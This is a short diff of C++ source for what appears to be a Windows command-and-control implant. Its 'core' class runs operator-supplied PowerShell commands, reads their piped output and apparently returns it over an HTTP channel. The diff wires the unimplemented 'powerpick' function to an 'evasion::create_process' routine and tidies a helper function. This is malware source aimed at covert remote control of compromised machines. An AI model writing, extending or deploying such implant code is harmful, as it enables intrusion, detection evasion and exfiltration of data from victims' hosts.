@@ -21,6 +21,7 @@ core* core::instance = NULL;
 bool core::terminated = false;
 int core::sleepTime = 5;
 std::string core::currentPath = "C:\\";
+
 //Communicator *core::communicator = NULL;
 
 core::core() {
@@ -128,15 +129,18 @@ void core::execute_powershell(std::string cmd) {
 	wcscpy_s(genericFullCommand, wideFullCommand.size() + 1, wideFullCommand.c_str());
 	PROCESS_INFO* info = process::create_process(genericFullCommand);
 	// to read from pipe
+
 	if (info->stdOutRd) {
 		this->read_pipe(info->stdOutRd);
 	}
+
 }
 
 void core::execute_powerpick(std::string cmd) {
 	// NOT IMPLEMENTED
+	evasion::create_process(cmd.c_str());
 }
-bool invalidChar(char c)
+bool core::invalid_char(char c)
 {
 	return !(c >= 0 && c < 128);
 }
@@ -164,7 +168,7 @@ void core::read_pipe(HANDLE rdPipe) {
 
 		if (!bSuccess) break;
 	}
-	completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), invalidChar), completeResult.end());
+	completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), core::invalid_char), completeResult.end());
 
 	// we will assume HTTP always for now
 	if(HttpCommunicator::communicator)
